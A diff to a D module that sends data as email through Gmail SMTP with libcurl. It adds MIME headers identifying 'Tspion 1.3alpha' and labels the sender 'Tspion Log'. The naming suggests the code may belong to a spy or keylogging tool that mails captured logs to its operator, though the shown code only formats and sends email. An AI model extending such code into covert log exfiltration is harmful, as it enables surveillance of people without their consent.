@@ -5,6 +5,7 @@ import std.stdio;
 import etc.curl;
 import std.string;
 import std.c.string : memcpy;
+import std.compiler;
 
 struct PutData
 {
@@ -26,7 +27,21 @@ extern(C) size_t read_callback(void* ptr, size_t size, size_t nmemb, void* userp
 
 string formatEmailData(string rawData, string from, string subject)
 {
-     return "From: " ~ from ~ "\nSubject: " ~ subject ~ "\n" ~ rawData;
+     return "MIME-Version: 1.0" ~
+            
+            "\nReceived: Tspion 1.3alpha/"~
+            "libcurl "~LIBCURL_VERSION~"/"~
+            "dmd "~std.conv.to!string(version_major)~
+            ".0"~std.conv.to!string(version_minor) ~
+            
+            "\nFrom: Tspion Log <" ~ from ~ ">" ~
+            
+            "\nSubject: " ~ subject ~
+            
+            "\nContent-Type: text/plain; charset=ascii" ~
+            
+            "\n\n" ~
+            rawData;
 }
 
 void sendStringWithGmail(string username, string password, string recipient, string data, Curl curl = null)
@@ -39,7 +54,7 @@ void sendStringWithGmail(string username, string password, string[] recipients, 
     sendWithGmail(username, password, recipients, cast(void*)&(PutData(toStringz(data),  data.length)), data.length, true, curl);
 }
 
-version(!Windows)  //Segfaults when data is sent to SMTP server on Windows, but not on Linux... strange
+version(Linux)  //Segfaults when data is sent to SMTP server on Windows, but not on Linux... strange
 {
 void sendWithGmail(string username, string password, string recipient, string filename, Curl curl = null)
 {
